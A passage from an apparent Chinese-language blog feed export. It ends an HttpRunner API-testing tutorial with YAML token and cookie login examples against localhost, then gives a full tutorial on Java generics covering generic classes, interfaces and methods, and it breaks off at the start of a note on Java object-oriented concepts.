class="line">&#123;&quot;args&quot;:&#123;&quot;time&quot;:&quot;1662365339120&quot;&#125;,&quot;headers&quot;:&#123;&quot;x-forwarded-proto&quot;:&quot;https&quot;,&quot;x-forwarded-port&quot;:&quot;443&quot;,&quot;host&quot;:&quot;postman-echo.com&quot;,&quot;x-amzn-trace-id&quot;:&quot;Root=1-6315ae94-58d38b1f1c45c8b94273a5a3&quot;,&quot;user-agent&quot;:&quot;Go-http-client/1.1&quot;,&quot;cookie&quot;:&quot;sails.sid=s%3A9zczVs9TODPR3d-xi5F59muThb8LgjjY.bDP%2FcJnt8Ou9QPjs7Y9v15utVqCU%2FrK3EddVu6ThODc&quot;,&quot;accept-encoding&quot;:&quot;gzip&quot;&#125;,&quot;url&quot;:&quot;https://postman-echo.com/get?time=1662365339120&quot;&#125;</span><br><span class="line">--------------------------------------------------</span><br><span class="line">4:08PM INF validate body.args.time assertMethod=length_equals checkExpr=body.args.time checkValue=1662365339120 checkValueType=string expectValue=13 expectValueType=int64 result=true</span><br><span class="line">4:08PM INF run step end exportVars=null step=&quot;get with timestamp&quot; success=true type=request</span><br><span class="line">4:08PM INF run testcase end testcase=&quot;demo with complex mechanisms&quot;</span><br><span class="line">4:08PM INF quit hashicorp plugin process</span><br><span class="line">2022-09-05T16:09:01.733+0800 [WARN]  grpc-py: plugin failed to exit gracefully</span><br></pre></td></tr></table></figure>

<blockquote>
<p>pytest也支持，测试 case 的文件应该以 _test 结尾</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&gt;hrp pytest testcases/py_test.py --html=/report/index.html  --junit-xml=/report/report.xml</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li>执行完成后，在reports目录发现了测试报告的html文件</li>
</ul>
<p><img src="/aposts/aa9cf483/image-20220905161310265.png" alt="image-20220905161310265"></p>
<h2 id="关于登录"><a href="#关于登录" class="headerlink" title="关于登录"></a>关于登录</h2><p>很多用例都是需要登录后才能处理，如果比较简单可以类似这样处理，下面取token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- config:</span><br><span class="line">    name: logincase</span><br><span class="line">    variables: &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">teststeps:</span><br><span class="line">-</span><br><span class="line">    name: login case1</span><br><span class="line">    request:</span><br><span class="line">        url: http://127.0.0.1:8000/api/v1/login/</span><br><span class="line">        method: POST</span><br><span class="line">        headers:</span><br><span class="line">            Content-Type: application/json</span><br><span class="line">            User-Agent: python-requests/2.18.4</span><br><span class="line">        json:</span><br><span class="line">            username: test</span><br><span class="line">            password: 123456</span><br><span class="line">    extract:</span><br><span class="line">        - token: content.token         # 提取token</span><br><span class="line">- </span><br><span class="line">    name: get user info case1</span><br><span class="line">    request:</span><br><span class="line">        url: http://127.0.0.1:8000/api/v1/user/info/</span><br><span class="line">        method: GET</span><br><span class="line">        headers:</span><br><span class="line">            Content-Type: application/json</span><br><span class="line">            User-Agent: python-requests/2.18.4</span><br><span class="line">            Authorization: Token $token          # 引用token</span><br></pre></td></tr></table></figure>

<ul>
<li>cookie</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- config:</span><br><span class="line">    name: logincase</span><br><span class="line">    variables: &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">teststeps:</span><br><span class="line">-</span><br><span class="line">    name: login case1</span><br><span class="line">    request:</span><br><span class="line">        url: http://127.0.0.1:8000/api/v1/login/</span><br><span class="line">        method: POST</span><br><span class="line">        headers:</span><br><span class="line">            Content-Type: application/json</span><br><span class="line">            User-Agent: python-requests/2.18.4</span><br><span class="line">        json:</span><br><span class="line">            username: test</span><br><span class="line">            password: 123456</span><br><span class="line">    extract:</span><br><span class="line">        - cookievalue: headers.Set-Cookie # 提取Cookie</span><br><span class="line">- </span><br><span class="line">    name: get user info case1</span><br><span class="line">    request:</span><br><span class="line">        url: http://127.0.0.1:8000/api/v1/user/info/</span><br><span class="line">        method: GET</span><br><span class="line">        headers:</span><br><span class="line">            Content-Type: application/json</span><br><span class="line">            User-Agent: python-requests/2.18.4</span><br><span class="line">            cookie: $cookievalue # 把提取到的 cookies 附加到本次请求头域  </span><br></pre></td></tr></table></figure>

<ul>
<li>如果是比较复杂的登录校验，可以采用<code>setup_hooks</code>调用自定义函数（<code>debugtalk.py</code>中编写）完成登录校验</li>
</ul>
<h2 id="性能压测"><a href="#性能压测" class="headerlink" title="性能压测"></a>性能压测</h2><ul>
<li>关于性能测试，可以参考<a href="https://httprunner.com/docs/user-guide/load-test/">这里</a>，需要用go</li>
<li>本地的项目需要采用<code>hrp startproject demo --go</code>来新建go插件的项目</li>
</ul>
]]></content>
      <categories>
        <category>httprunner</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>httprunner</tag>
      </tags>
  </entry>
  <entry>
    <title>java中泛型</title>
    <url>/aposts/239281b1/</url>
    <content><![CDATA[<h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><ul>
<li>本次java 版本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;java -version</span><br><span class="line">java version &quot;1.8.0_381&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_381-b09)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.381-b09, mixed mode</span><br></pre></td></tr></table></figure>



<ul>
<li><p>泛型的本质是为了将类型参数化，数据类型被设置为一个参数，在使用时再从外部传入一个数据类型；而一旦传入了具体的数据类型后，传入变量（实参）的数据类型如果不匹配，编译器就会直接报错</p>
</li>
<li><p>在 ArrayList 集合中，可以放入所有类型的对象，假设现在需要一个只存储了 String 类型对象的 ArrayList 集合</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">   list.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">   list.add(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">   list.add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">       System.out.println((String)list.get(i));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>但如果在添加 String 对象时，不小心添加了一个 Integer 对象</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line">        list.add(<span class="number">111</span>); <span class="comment">//新增数字</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            System.out.println((String)list.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>上述代码在编译时没有报错，但在运行时却抛出了一个 <code>ClassCastException 异常</code>，其原因是 Integer 对象不能强转为 String 类型</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   Exception in thread &quot;main&quot; java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String</span><br><span class="line">at Main.main(Main.java:11)</span><br></pre></td></tr></table></figure>

<ul>
<li>使用泛型</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line">        list.add(<span class="number">111</span>); <span class="comment">// 编译阶段，编译器会报错</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">            System.out.println((String)list.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/aposts/239281b1/image-20231113153841330.png" alt="image-20231113153841330"></p>
<ul>
<li><p>因此，当具体的数据类型确定后，泛型又提供了一种<code>类型安全检测机制</code>，只有数据类型相匹配的变量才能正常的赋值，否则编译器就不通过。所以说，泛型一定程度上提高了软件的安全性，防止出现低级的失误。</p>
</li>
<li><p>泛型有三种使用方式，分别为：<strong>泛型类、泛型接口、泛型方法</strong>。</p>
</li>
</ul>
<h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><ul>
<li>定义</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class 类名称 &lt;泛型标识&gt; &#123;</span><br><span class="line">  private 泛型标识 /*（成员变量类型）*/ 变量名; </span><br><span class="line">  .....</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>尖括号 &lt;&gt; 中的 泛型标识被称作是<code>类型参数</code>，用于指代任何数据类型</li>
<li>泛型标识是任意设置的（如果你想可以设置为 Hello都行），Java 常见的泛型标识以及其代表含义如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T ：代表一般的任何类。</span><br><span class="line">E ：代表 Element 元素的意思，或者 Exception 异常的意思。</span><br><span class="line">K ：代表 Key 的意思。</span><br><span class="line">V ：代表 Value 的意思，通常与 K 一起配合使用。</span><br><span class="line">S ：代表 Subtype 的意思，文章后面部分会讲解示意。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>举例如下</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generic</span>&lt;T&gt; &#123; </span><br><span class="line">    <span class="comment">// key 这个成员变量的数据类型为 T, T 的类型由外部传入  </span></span><br><span class="line">    <span class="keyword">private</span> T key;</span><br><span class="line">	<span class="comment">// 泛型构造方法形参 key 的类型也为 T，T 的类型由外部传入</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Generic</span><span class="params">(T key)</span> &#123; </span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// 泛型方法 getKey 的返回值类型为 T，T 的类型由外部指定</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getKey</span><span class="params">()</span>&#123; </span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>泛型类中的静态方法和静态变量不可以使用泛型类所声明的类型参数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span>&lt;T&gt; &#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> T one;   <span class="comment">// 编译错误    </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> T <span class="title function_">show</span><span class="params">(T one)</span>&#123; <span class="comment">// 编译错误    </span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>而静态变量和静态方法在类加载时已经初始化，直接使用类名调用；在泛型类的类型参数未确定时，静态成员有可能被调用，因此泛型类的类型参数是不能在静态成员中使用的。</li>
</ul>
</blockquote>
<ul>
<li>泛型类不只接受一个类型参数，它还可以接受多个类型参数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MultiType</span> &lt;E,T&gt; &#123;</span><br><span class="line">	E value1;</span><br><span class="line">	T value2;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> E <span class="title function_">getValue1</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> value1;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> T <span class="title function_">getValue2</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> value2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>看如下实例：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Generic</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> T key;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Generic</span><span class="params">(T key)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">       Generic&lt;String&gt; generic = <span class="keyword">new</span> <span class="title class_">Generic</span>&lt;&gt;(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">       System.out.println(generic.getKey());</span><br><span class="line"></span><br><span class="line">       <span class="comment">// // &lt;&gt; 中什么都不传入，等价于 Generic&lt;Object&gt; generic = new Generic&lt;&gt;();</span></span><br><span class="line">       <span class="type">Generic</span> <span class="variable">generic1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Generic</span>(<span class="string">&quot;word&quot;</span>);</span><br><span class="line">        System.out.println(generic1.getKey());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><ul>
<li>定义</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public interface 接口名&lt;类型参数&gt; &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public interface Inter&lt;T&gt; &#123;</span><br><span class="line">    public abstract void show(T t) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>在泛型接口中，<strong>静态成员也不能使用泛型接口定义的类型参数</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IUsb</span>&lt;U, R&gt; &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">   U name;<span class="comment">// 报错！ 接口中的属性默认是静态的，因此不能使用类型参数声明</span></span><br><span class="line">    R <span class="title function_">get</span><span class="params">(U u)</span>;<span class="comment">// 普通方法中，可以使用类型参数</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">(R r)</span>;<span class="comment">// 抽象方法中，可以使用类型参数</span></span><br><span class="line">    <span class="keyword">default</span> R <span class="title function_">method</span><span class="params">(U u)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>定义一个接口 IA 继承了 泛型接口 IUsb，在 接口 IA 定义时必须<strong>确定泛型接口 IUsb 中的类型参数</strong>。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//IA.java</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在继承泛型接口时，必须确定泛型接口的类型参数</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IA</span> <span class="keyword">extends</span> <span class="title class_">IUsb</span>&lt;String, Double&gt; &#123; &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>AA继承了IA的接口，而IA接口继承了IUsb并指定了特定的泛型参数，因此AA其实就是实现了IUsb接口的方法get和hi方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当去实现 IA 接口时，因为 IA 在继承 IUsu 接口时，指定了类型参数 U 为 String，R 为 Double</span></span><br><span class="line"><span class="comment">// 所以在实现 IUsb 接口的方法时，使用 String 替换 U,用 Double 替换 R</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AA</span> <span class="keyword">implements</span> <span class="title class_">IA</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Double <span class="title function_">get</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;AA 的Double get=&quot;</span> + s);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">(Double d)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;AA hi=&quot;</span> +d);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>运行代码</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">AA</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AA</span>();</span><br><span class="line">        aa.get(<span class="string">&quot;哈哈&quot;</span>);</span><br><span class="line">        aa.hi(<span class="number">10.01</span>);</span><br><span class="line">        aa.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line">AA 的Double get=哈哈</span><br><span class="line">AA hi=<span class="number">10.01</span></span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<ul>
<li>当然也可以直接用：定义一个类 BB 实现了 泛型接口 IUsb，在 类 BB 定义时需要确定泛型接口 IUsb 中的类型参数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实现接口时，需要指定泛型接口的类型参数</span></span><br><span class="line"><span class="comment">// 给 U 指定 Integer， 给 R 指定了 Float</span></span><br><span class="line"><span class="comment">// 所以，当我们实现 IUsb 方法时，会使用 Integer 替换 U, 使用 Float 替换 R</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BB</span> <span class="keyword">implements</span> <span class="title class_">IUsb</span>&lt;Integer, Float&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Float <span class="title function_">get</span><span class="params">(Integer integer)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;BB Float get=&quot;</span> + integer);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10.11F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">(Float afloat)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;BB hi=&quot;</span> +afloat);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义一个类 CC 实现了 泛型接口 IUsb 时，若是没有确定泛型接口 IUsb 中的类型参数，则默认为 Object</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC</span> <span class="keyword">implements</span> <span class="title class_">IUsb</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CC object get=&quot;</span> + o.toString());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;cc object hi=&quot;</span> + o.toString());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>定义一个类 DD 实现了 泛型接口 IUsb 时，若是没有确定泛型接口 IUsb 中的类型参数，也可以将 DD 类也定义为泛型类，其声明的类型参数必须要和接口 IUsb 中的类型参数相同</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// DD 类定义为 泛型类，则不需要确定 接口的类型参数</span><br><span class="line">// 但 DD 类定义的类型参数要和接口中类型参数的一致</span><br><span class="line">class DD&lt;U, R&gt; implements IUsb&lt;U, R&gt; &#123; </span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h2><ul>
<li>当在一个方法签名中的返回值前面声明了一个 &lt; T &gt; 时，该方法就被声明为一个<code>泛型方法</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public &lt;类型参数&gt; 返回类型 方法名（类型参数 变量名） &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class Test&lt;U&gt; &#123;</span><br><span class="line">	// 该方法只是使用了泛型类定义的类型参数，不是泛型方法</span><br><span class="line">	public void testMethod(U u)&#123;</span><br><span class="line">		System.out.println(u);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	// &lt;T&gt; 真正声明了下面的方法是一个泛型方法</span><br><span class="line">	public &lt;T&gt; T testMethod1(T t)&#123;</span><br><span class="line">		return t;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>实现了普通方法和泛型方法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test&lt;T&gt; &#123;</span><br><span class="line">    // 是泛型类中的普通方法</span><br><span class="line">    public void testMethod(T t) &#123;</span><br><span class="line">        System.out.println(t);</span><br><span class="line">    &#125;</span><br><span class="line">    // 是一个泛型方法</span><br><span class="line">    public &lt;T&gt; T testMethod1(T t) &#123;</span><br><span class="line">        return t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>运行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">        Test test = new Test&lt;Integer&gt;();</span><br><span class="line">        test.testMethod(&quot;112&quot;);</span><br><span class="line">        String tt = (String) test.testMethod1(&quot;你好&quot;);</span><br><span class="line">        System.out.println(tt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>当然泛型方法也可用到普通类中</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="comment">// 普通方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMethod</span><span class="params">(String t)</span> &#123;</span><br><span class="line">        System.out.println(t);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 是一个泛型方法</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">testMethod1</span><span class="params">(T t)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在调用泛型方法的时候，可以显式地指定类型参数，也可以不指定</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 这是一个简单的泛型方法  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">add</span><span class="params">(T x, T y)</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> y;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="comment">// 一、不显式地指定类型参数</span></span><br><span class="line">        <span class="comment">//（1）传入的两个实参都是 Integer，所以泛型方法中的&lt;T&gt; == &lt;Integer&gt; </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//（2）传入的两个实参一个是 Integer，另一个是 Float，</span></span><br><span class="line">        <span class="comment">// 所以&lt;T&gt;取共同父类的最小级，&lt;T&gt; == &lt;Number&gt;</span></span><br><span class="line">		<span class="type">Number</span> <span class="variable">f</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="number">1.2</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 传入的两个实参一个是 Integer，另一个是 String，</span></span><br><span class="line">		<span class="comment">// 所以&lt;T&gt;取共同父类的最小级，&lt;T&gt; == &lt;Object&gt;</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Test.add(<span class="number">1</span>, <span class="string">&quot;asd&quot;</span>);</span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 二、显式地指定类型参数</span></span><br><span class="line">        <span class="comment">//（1）指定了&lt;T&gt; = &lt;Integer&gt;，所以传入的实参只能为 Integer 对象    </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Test.&lt;Integer&gt;add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//（2）指定了&lt;T&gt; = &lt;Integer&gt;，所以不能传入 Float 对象</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> Test.&lt;Integer&gt;add(<span class="number">1</span>, <span class="number">2.2</span>);<span class="comment">// 编译错误</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//（3）指定&lt;T&gt; = &lt;Number&gt;，所以可以传入 Number 对象</span></span><br><span class="line">        <span class="comment">// Integer 和 Float 都是 Number 的子类，因此可以传入两者的对象</span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">c</span> <span class="operator">=</span> Test.&lt;Number&gt;add(<span class="number">1</span>, <span class="number">2.2</span>); </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>泛型类，在创建类的对象的时候确定类型参数的具体类型；<br>泛型方法，在调用方法的时候再确定类型参数的具体类型。</p>
</blockquote>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>后续还有更多高级的用法，比如类型擦除、通配符等有空继续按照此<a href="https://blog.csdn.net/weixin_45395059/article/details/126006369">博主</a>内容进行学习</li>
</ul>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java中面向对象</title>
    <url>/aposts/a5664de/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本次笔记主要记录面向对象中的继承、重载重写、多态、抽象、封装、接口、包等概念</p>
<p>java版本为：java version “1.8.0_381”</p>
